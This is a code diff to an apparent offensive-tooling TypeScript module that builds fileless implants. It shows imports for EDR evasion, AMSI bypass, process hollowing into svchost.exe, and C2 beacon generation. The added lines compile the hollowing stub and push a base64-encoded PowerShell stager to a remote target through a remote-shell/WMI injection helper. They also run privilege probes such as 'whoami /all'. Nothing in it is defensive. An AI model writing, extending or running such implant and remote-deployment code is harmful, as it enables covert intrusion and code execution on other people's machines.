@@ -6,8 +6,9 @@ import { EvasionExecutor, buildPowerShellStager, renderBypassPayload } from "../
 import { EDREvasionEngine } from "../edr_evasion.ts"
 import { NativeImplantGenerator } from "../implant_gen.ts"
 import { generateProcessHollowingStub } from "../malware_dev.ts"
-import { ensureAresDir, liveRequired, writeArtifact } from "./_base.ts"
+import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
 import { c2Material, execEvasionPlans, step, type ExecStep } from "./_integrations.ts"
+import { deployRemoteShell, runPlatformCmd } from "./_operational.ts"
 
 export interface FilelessImplantResult {
   artifacts: string[]
@@ -22,6 +23,7 @@ export async function buildFilelessImplant(opts: {
   live?: boolean
   payload?: string
   target?: string
+  domain?: string
 }): Promise<FilelessImplantResult> {
   liveRequired("ares_fileless_implant", opts)
   const dir = ensureAresDir("fileless")
@@ -54,8 +56,19 @@ export async function buildFilelessImplant(opts: {
   artifacts.push(ps)
   steps.push(step("powershell_stager", true, renderBypassPayload("amsi-reflection").slice(0, 100)))
 
+  if (isToolAvailable("pwsh") || isToolAvailable("powershell")) {
+    const shell = isToolAvailable("pwsh") ? "pwsh" : "powershell"
+    const r = await brokerExec(`${shell} -NoProfile -Command "Get-ExecutionPolicy" 2>&1`)
+    steps.push(step("powershell_policy_probe", r.ok, r.out.slice(0, 200)))
+  }
+
   const hollow = writeArtifact("fileless", "process_hollow.c", generateProcessHollowingStub("svchost.exe"))
   artifacts.push(hollow)
+  if (isToolAvailable("gcc")) {
+    const hollowBin = `${dir}/process_hollow_test`
+    const r = await brokerExec(`gcc -o ${hollowBin} ${hollow} 2>&1`)
+    steps.push(step("process_hollow_compile", r.ok, r.out.slice(0, 200)))
+  }
 
   const { mailboxUrl, keyHex, session } = c2Material()
   const gen = new NativeImplantGenerator()
@@ -64,6 +77,22 @@ export async function buildFilelessImplant(opts: {
   if (goBuild.artifact) artifacts.push(goBuild.artifact)
   if (goBuild.status === "built") built = true
   steps.push(step("native_beacon", goBuild.status === "built", goBuild.note ?? goBuild.status, goBuild.artifact))
+
+  const target = opts.target
+  if (target && target !== "127.0.0.1" && target !== "localhost") {
+    const remoteCmd = process.platform === "win32"
+      ? `powershell -NoProfile -EncodedCommand ${Buffer.from(psStager).toString("base64")}`
+      : `echo OURMINE_FILELESS_PROBE`
+    steps.push(await deployRemoteShell({ host: target, command: remoteCmd, domain: opts.domain }))
+    if (steps[steps.length - 1]?.success) executed = true
+    techniques.push("remote_wmi_inject")
+  }
+
+  steps.push(await runPlatformCmd(
+    "token_exec_probe",
+    "id 2>&1",
+    "whoami /all 2>&1 | head -15",
+  ))
 
   return {
     artifacts,
